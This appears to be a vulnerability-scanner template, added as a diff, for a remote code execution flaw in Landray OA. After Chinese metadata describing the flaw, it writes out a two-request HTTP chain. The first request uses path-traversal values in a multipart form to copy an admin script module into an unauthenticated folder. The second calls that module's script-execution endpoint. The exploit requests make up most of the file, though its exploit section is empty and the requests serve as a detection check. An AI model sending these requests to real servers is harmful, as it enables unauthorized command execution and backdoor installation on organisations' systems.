@@ -1,0 +1,70 @@
+app: 蓝凌oa
+query: app:"Landray"
+meta:
+  name: 蓝凌OA 文件Copy导致远程代码执行
+  level: 5
+  tags:
+  - remote_code_execution
+  description: 蓝凌OA平台，数字化向纵深发展，正加速构建产业互联网，对企业协作能力提出更高要求，蓝凌新一代生态型OA平台能够支撑办公数字化、管理智能化、应用平台化、组织生态化，赋能大中型组织的内外协作与管理，支撑商业模式创新与转型发展。由于蓝凌OA代码功能模块设计缺陷问题，攻击者可以利用文件复制的方式，将后台脚本功能模块文件复制到无需权限认证的目录下，导致未经过身份认证的攻击者利用后台脚本执行模块，远程命令执行，写入后门文件并获取服务器权限。
+  homepage: ""
+  author: 院长
+  references: https://mp.weixin.qq.com/s/oP0a0WWmevNX8NCqvBGzEg
+  solution: 升级。
+  create_at: "2024-07-29 05:28:04"
+  available: false
+  steps:
+    variable: []
+    verify_steps:
+      type: and
+      verify:
+      - request:
+          method: POST
+          path: /sys/ui/sys_ui_component/sysUiComponent.do
+          redirect: true
+          header:
+          - Accept: application/json,text/javascript,*/*;q=0.01
+          - Accept-Encoding: gzip,deflate
+          - Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
+          - Connection: close
+          - Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryL7ILSpOdIhIIvL51
+          - User-Agent: Mozilla/5.0(WindowsNT10.0;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/83.0.4103.116Safari/537.36
+          - X-Requested-With: XMLHttpRequest
+          - Content-Length: "395"
+          params: |-
+            ------WebKitFormBoundaryL7ILSpOdIhIIvL51
+            Content-Disposition:form-data;name="method"
+
+            replaceExtend
+            ------WebKitFormBoundaryL7ILSpOdIhIIvL51
+            Content-Disposition:form-data;name="extendId"
+
+            ../../../../resource/help/km/review/
+            ------WebKitFormBoundaryL7ILSpOdIhIIvL51
+            Content-Disposition:form-data;name="folderName"
+
+            ../../../ekp/sys/common
+            ------WebKitFormBoundaryL7ILSpOdIhIIvL51--
+        response:
+        - name: code
+          value: "200"
+          type: equals
+      - request:
+          method: POST
+          path: /resource/help/km/review/dataxml.jsp
+          redirect: true
+          header:
+          - User-Agent: Mozilla/5.0(Macintosh;IntelMacOSX10_15_7)AppleWebKit/537.36(KHTML,likeGecko)Chrome/113.0.0.0Safari/537.36
+          - Connection: close
+          - Content-Length: "17392"
+          - Content-Type: application/x-www-form-urlencoded
+          params: s_bean=ruleFormulaValidate&script=shell&returnType=int&modelName=test
+        response:
+        - name: code
+          value: "200"
+          type: equals
+    exploit_steps:
+      type: ""
+      params:
+        name: ""
+        type: input
+        value: ""
